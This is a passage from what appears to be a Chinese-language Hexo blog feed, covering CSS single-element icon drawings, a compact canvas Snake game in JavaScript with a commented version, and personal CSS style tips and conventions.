   <span class="attribute">background</span>: red;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">0.35em</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">0.08em</span>;</span><br><span class="line">      <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_16.png" alt="img_16.png"></p><h1 id="Facebook"><a href="#Facebook" class="headerlink" title="Facebook"></a>Facebook</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#facebook-icon</span> &#123;</span><br><span class="line">     <span class="attribute">background</span>: red;</span><br><span class="line">     <span class="attribute">text-indent</span>: -<span class="number">999em</span>;</span><br><span class="line">     <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">     <span class="attribute">height</span>: <span class="number">110px</span>;</span><br><span class="line">     <span class="attribute">box-sizing</span>: content-box;</span><br><span class="line">     <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">     <span class="attribute">position</span>: relative;</span><br><span class="line">     <span class="attribute">overflow</span>: hidden;</span><br><span class="line">     <span class="attribute">border</span>: <span class="number">15px</span> solid red;</span><br><span class="line">     <span class="attribute">border-bottom</span>: <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-id">#facebook-icon</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">     <span class="attribute">content</span>: <span class="string">&quot;/20&quot;</span>;</span><br><span class="line">     <span class="attribute">position</span>: absolute;</span><br><span class="line">     <span class="attribute">background</span>: red;</span><br><span class="line">     <span class="attribute">width</span>: <span class="number">40px</span>;</span><br><span class="line">     <span class="attribute">height</span>: <span class="number">90px</span>;</span><br><span class="line">     <span class="attribute">bottom</span>: -<span class="number">30px</span>;</span><br><span class="line">     <span class="attribute">right</span>: -<span class="number">37px</span>;</span><br><span class="line">     <span class="attribute">border</span>: <span class="number">20px</span> solid <span class="number">#eee</span>;</span><br><span class="line">     <span class="attribute">border-radius</span>: <span class="number">25px</span>;</span><br><span class="line">     <span class="attribute">box-sizing</span>: content-box;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-id">#facebook-icon</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">     <span class="attribute">content</span>: <span class="string">&quot;/20&quot;</span>;</span><br><span class="line">     <span class="attribute">position</span>: absolute;</span><br><span class="line">     <span class="attribute">width</span>: <span class="number">55px</span>;</span><br><span class="line">     <span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line">     <span class="attribute">height</span>: <span class="number">20px</span>;</span><br><span class="line">     <span class="attribute">background</span>: <span class="number">#eee</span>;</span><br><span class="line">     <span class="attribute">right</span>: <span class="number">5px</span>;</span><br><span class="line">     <span class="attribute">box-sizing</span>: content-box;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_17.png" alt="img_17.png"></p><h1 id="月亮"><a href="#月亮" class="headerlink" title="月亮"></a>月亮</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#moon</span> &#123;</span><br><span class="line">     <span class="attribute">width</span>: <span class="number">80px</span>;</span><br><span class="line">     <span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line">     <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">     <span class="attribute">box-shadow</span>: <span class="number">15px</span> <span class="number">15px</span> <span class="number">0</span> <span class="number">0</span> red;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_18.png" alt="img_18.png"></p><h1 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#lock</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">18em</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">13em</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">2em</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">10em</span>;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">3.5em</span> solid red;</span><br><span class="line">  <span class="attribute">border-right-width</span>: <span class="number">7.5em</span>;</span><br><span class="line">  <span class="attribute">border-left-width</span>: <span class="number">7.5em</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">6rem</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#lock</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">2.5em</span> solid red;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">14em</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">12em</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">7em</span>;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">12em</span>;</span><br><span class="line">  <span class="attribute">border-top-left-radius</span>: <span class="number">7em</span>;</span><br><span class="line">  <span class="attribute">border-top-right-radius</span>: <span class="number">7em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#lock</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1em</span> solid red;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">5em</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">8em</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">2.5em</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">2.5em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_19.png" alt="img_19.png"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>分享一个大神用20多行代码写的贪吃蛇</title>
      <link href="/Blog/2017/12/21/essay/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E5%A4%A7%E7%A5%9E%E7%94%A820%E5%A4%9A%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%86%99%E7%9A%84%E8%B4%AA%E5%90%83%E8%9B%87/index/"/>
      <url>/Blog/2017/12/21/essay/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E5%A4%A7%E7%A5%9E%E7%94%A820%E5%A4%9A%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%86%99%E7%9A%84%E8%B4%AA%E5%90%83%E8%9B%87/index/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;can&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background: Black&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> sn = [ <span class="number">42</span>, <span class="number">41</span> ], dz = <span class="number">43</span>, fx = <span class="number">1</span>, n, ctx = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;can&quot;</span>).<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>);  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">draw</span>(<span class="params">t, c</span>) &#123;  </span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="property">fillStyle</span> = c;  </span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">fillRect</span>(t % <span class="number">20</span> * <span class="number">20</span> + <span class="number">1</span>, ~~(t / <span class="number">20</span>) * <span class="number">20</span> + <span class="number">1</span>, <span class="number">18</span>, <span class="number">18</span>);  </span></span><br><span class="line"><span class="language-javascript">        &#125;  </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;  </span></span><br><span class="line"><span class="language-javascript">            fx = sn[<span class="number">1</span>] - sn[<span class="number">0</span>] == (n = [ -<span class="number">1</span>, -<span class="number">20</span>, <span class="number">1</span>, <span class="number">20</span> ][(e || event).<span class="property">keyCode</span> - <span class="number">37</span>] || fx) ? fx : n  </span></span><br><span class="line"><span class="language-javascript">        &#125;;  </span></span><br><span class="line"><span class="language-javascript">        !<span class="keyword">function</span>(<span class="params"></span>) &#123;  </span></span><br><span class="line"><span class="language-javascript">            sn.<span class="title function_">unshift</span>(n = sn[<span class="number">0</span>] + fx);  </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (sn.<span class="title function_">indexOf</span>(n, <span class="number">1</span>) &gt; <span class="number">0</span> || n&lt;<span class="number">0</span>||n&gt;<span class="number">399</span> || fx == <span class="number">1</span> &amp;&amp; n % <span class="number">20</span> == <span class="number">0</span> || fx == -<span class="number">1</span> &amp;&amp; n % <span class="number">20</span> == <span class="number">19</span>)  </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="title function_">alert</span>(<span class="string">&quot;GAME OVER&quot;</span>);  </span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">draw</span>(n, <span class="string">&quot;Lime&quot;</span>);  </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (n == dz) &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">while</span> (sn.<span class="title function_">indexOf</span>(dz = ~~(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">400</span>)) &gt;= <span class="number">0</span>);  </span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">draw</span>(dz, <span class="string">&quot;Yellow&quot;</span>);  </span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span>  </span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">draw</span>(sn.<span class="title function_">pop</span>(), <span class="string">&quot;Black&quot;</span>);  </span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">setTimeout</span>(<span class="variable language_">arguments</span>.<span class="property">callee</span>, <span class="number">130</span>);  </span></span><br><span class="line"><span class="language-javascript">        &#125;();  </span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>注释版</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>贪吃蛇重构<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">   <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">   <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">   <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">   <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">   <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">   <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"> </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;can&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: black&quot;</span>&gt;</span>对不起，您的浏览器不支持canvas<span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> snake = [<span class="number">41</span>, <span class="number">40</span>],  <span class="comment">//snake队列表示蛇身，初始节点存在但不显示</span></span></span><br><span class="line"><span class="language-javascript">   direction = <span class="number">1</span>,   <span class="comment">//1表示向右，-1表示向左，20表示向下，-20表示向上</span></span></span><br><span class="line"><span class="language-javascript">   food = <span class="number">43</span>,    <span class="comment">//食物的位置</span></span></span><br><span class="line"><span class="language-javascript">   n,      <span class="comment">//与下次移动的位置有关 </span></span></span><br><span class="line"><span class="language-javascript">   box = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;can&#x27;</span>).<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">         <span class="comment">//从0到399表示box里[0~19]*[0~19]的所有节点，每20px一个节点</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">draw</span>(<span class="params">seat, color</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">   box.<span class="property">fillStyle</span> = color;</span></span><br><span class="line"><span class="language-javascript">   box.<span class="title function_">fillRect</span>(seat % <span class="number">20</span> *<span class="number">20</span> + <span class="number">1</span>, ~~(seat / <span class="number">20</span>) * <span class="number">20</span> + <span class="number">1</span>, <span class="number">19</span>, <span class="number">19</span>);</span></span><br><span class="line"><span class="language-javascript">         <span class="comment">//用color填充一个矩形，以前两个参数为x，y坐标，后两个参数为宽和高。</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span>(<span class="params">evt</span>) &#123; </span></span><br><span class="line"><span class="language-javascript">         <span class="comment">//当键盘上下左右键摁下的时候改变direction</span></span></span><br><span class="line"><span class="language-javascript">   direction = snake[<span class="number">1</span>] - snake[<span class="number">0</span>] == (n = [-<span class="number">1</span>, -<span class="number">20</span>, <span class="number">1</span>, <span class="number">20</span>][(evt || event).<span class="property">keyCode</span> - <span class="number">37</span>] || direction) ? direction : n;</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">   snake.<span class="title function_">unshift</span>(n = snake[<span class="number">0</span>] + direction); </span></span><br><span class="line"><span class="language-javascript">         <span class="comment">//此时的n为下次蛇头出现的位置，n进入队列</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">if</span>(snake.<span class="title function_">indexOf</span>(n, <span class="number">1</span>) &gt; <span class="number">0</span> || n &lt; <span class="number">0</span> || n &gt; <span class="number">399</span> || direction == <span class="number">1</span> &amp;&amp; n % <span class="number">20</span> == <span class="number">0</span> || direction == -<span class="number">1</span> &amp;&amp; n % <span class="number">20</span> == <span class="number">19</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="comment">//if语句判断贪吃蛇是否撞到自己或者墙壁，碰到时返回，结束程序</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="title function_">alert</span>(<span class="string">&quot;GAME OVER!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">draw</span>(n, <span class="string">&quot;lime&quot;</span>);  <span class="comment">//画出蛇头下次出现的位置</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">if</span>(n == food) &#123;   <span class="comment">//如果吃到食物时，产生一个蛇身以外的随机的点，不会去掉蛇尾</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">while</span> (snake.<span class="title function_">indexOf</span>(food = ~~(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">400</span>)) &gt; <span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">draw</span>(food, <span class="string">&quot;yellow&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">   &#125; <span class="keyword">else</span> &#123;    <span class="comment">//没有吃到食物时正常移动，蛇尾出队列</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">draw</span>(snake.<span class="title function_">pop</span>(),<span class="string">&quot;black&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   <span class="built_in">setTimeout</span>(<span class="variable language_">arguments</span>.<span class="property">callee</span>, <span class="number">100</span>);  </span></span><br><span class="line"><span class="language-javascript">         <span class="comment">//每隔0.15秒执行函数一次，可以调节蛇的速度</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)();</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自己总结的关于css部分技巧以及规范</title>
      <link href="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E6%80%BB%E7%BB%93%E7%9A%84%E5%85%B3%E4%BA%8Ecss%E9%83%A8%E5%88%86%E6%8A%80%E5%B7%A7%E4%BB%A5%E5%8F%8A%E8%A7%84%E8%8C%83/index/"/>
      <url>/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E6%80%BB%E7%BB%93%E7%9A%84%E5%85%B3%E4%BA%8Ecss%E9%83%A8%E5%88%86%E6%8A%80%E5%B7%A7%E4%BB%A5%E5%8F%8A%E8%A7%84%E8%8C%83/index/</url>
      
        <content type="html"><![CDATA[<p>1.尽量减少代码重复<br>当某些值相互依赖时，应该把他们的相互关系用代码表达出来<br>比如:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">6px</span> <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#58a</span> <span class="built_in">linear-gradient</span>(<span class="number">#fff</span>, <span class="number">#58a</span>);</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">5px</span> gary;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">0</span> -<span class="number">1px</span> <span class="number">5px</span> pink;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以尝试改成em单位，如果你希望能根据父级建立关联（代码可维护性的最大要素就是尽量减少改动时要编辑的地方）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attribute">padding</span>: .<span class="number">3em</span> .<span class="number">8em</span>;    //这里的浮点数个人认为填上<span class="number">0</span>，有利于代码可读性</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#58a</span> <span class="built_in">linear-gradient</span>(<span class="number">#fff</span>, <span class="number">#58a</span>);</span><br><span class="line">    <span class="attribute">border-radius</span>: .<span class="number">2em</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> .<span class="number">05em</span> .<span class="number">05em</span> gary;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">0</span> -.<span class="number">05em</span> .<span class="number">05em</span> pink;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">125%</span>;    //假设父级字号是<span class="number">16px</span></span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.代码易维护VS代码量少</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">10px</span> <span class="number">10px</span> <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-left-width</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然上一条只需要一条声明搞定，但是如果把它拆成两条声明的话，改动起来就容易多了。<br>3.currentcolor<br>当前的标签所继承的文字颜色<br>4.推荐使用HSLA而不是RGBA来产生半透明的白色，因为他的字符长度更短，她的重复率更低<br>5.calc()方案<br>可以允许我们在css中进行运算<br>例如想把背景图片定位到距离底边10px距离右边20px的位置:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">20px</span>) <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">10px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6.改变偏移中心点来居中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50</span>, -<span class="number">50%</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时使用top: 50%;left: 50%;达到居中。<br>7.减少使用 !important 优先级过高<br>8.层级(z-index)必须清晰明确，页面弹窗、气泡为最高级（最高级为999），不同弹窗气泡之间可在三位数之间调整；普通区块为10-90内10的倍数；区块展开、弹出为当前父层级上个位增加，禁止层级间盲目攀比。<br>9.属性编写顺序<br>1.位置属性(position, top, right, z-index, display, float等)<br>2.大小(width, height, padding, margin)<br>3.文字系列(font, line-height, letter-spacing, color, text-align等)<br>4.背景(background, border等)<br>5.其他(animation, 